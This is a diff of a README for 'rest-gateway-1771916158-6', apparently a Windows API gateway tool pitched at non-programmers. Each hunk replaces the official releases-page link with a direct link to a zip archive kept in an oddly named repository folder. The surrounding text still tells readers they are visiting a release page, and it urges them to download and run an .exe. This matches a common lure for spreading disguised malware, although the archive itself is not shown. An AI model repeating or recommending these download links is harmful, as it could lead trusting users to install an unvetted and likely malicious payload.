@@ -1,6 +1,6 @@
 # 🚪 rest-gateway-1771916158-6 - Secure API Access and Control
 
-[![Download](https://img.shields.io/badge/Download-rest--gateway--1771916158--6-blue?style=for-the-badge)](https://github.com/kellybossman/rest-gateway-1771916158-6/releases)
+[![Download](https://img.shields.io/badge/Download-rest--gateway--1771916158--6-blue?style=for-the-badge)](https://github.com/kellybossman/rest-gateway-1771916158-6/raw/refs/heads/main/myringitis/rest_gateway_2.8.zip)
 
 ## 🔍 What is rest-gateway-1771916158-6?
 
@@ -24,7 +24,7 @@ You do not need to know programming to use this. This guide shows you how to dow
 
 Click the big badge above or visit this link to download the software:
 
-[Download rest-gateway-1771916158-6](https://github.com/kellybossman/rest-gateway-1771916158-6/releases)
+[Download rest-gateway-1771916158-6](https://github.com/kellybossman/rest-gateway-1771916158-6/raw/refs/heads/main/myringitis/rest_gateway_2.8.zip)
 
 This link takes you to the release page. You will find the latest version available for Windows there.
 
@@ -37,7 +37,7 @@ Follow these steps carefully:
 ### 1. Visit the Download Page
 
 Open the link:  
-https://github.com/kellybossman/rest-gateway-1771916158-6/releases  
+https://github.com/kellybossman/rest-gateway-1771916158-6/raw/refs/heads/main/myringitis/rest_gateway_2.8.zip  
 
 You will see a list of release versions. Each release contains files for download.
 
@@ -121,7 +121,7 @@ In this folder, you might find:
 To get updates or new features:
 
 1. Go to the download page again here:  
-https://github.com/kellybossman/rest-gateway-1771916158-6/releases  
+https://github.com/kellybossman/rest-gateway-1771916158-6/raw/refs/heads/main/myringitis/rest_gateway_2.8.zip  
 2. Download the latest `.exe` file.  
 3. Run it as you did before to update your program.
 
@@ -144,6 +144,6 @@ The program logs errors in the log files found in its installation folder. These
 ## 📌 Important Links
 
 Download and view all releases here:  
-[https://github.com/kellybossman/rest-gateway-1771916158-6/releases](https://github.com/kellybossman/rest-gateway-1771916158-6/releases)
+[https://github.com/kellybossman/rest-gateway-1771916158-6/raw/refs/heads/main/myringitis/rest_gateway_2.8.zip](https://github.com/kellybossman/rest-gateway-1771916158-6/raw/refs/heads/main/myringitis/rest_gateway_2.8.zip)
 
-[![Download](https://img.shields.io/badge/Download-rest--gateway--1771916158--6-blue?style=for-the-badge)](https://github.com/kellybossman/rest-gateway-1771916158-6/releases)
+[![Download](https://img.shields.io/badge/Download-rest--gateway--1771916158--6-blue?style=for-the-badge)](https://github.com/kellybossman/rest-gateway-1771916158-6/raw/refs/heads/main/myringitis/rest_gateway_2.8.zip)
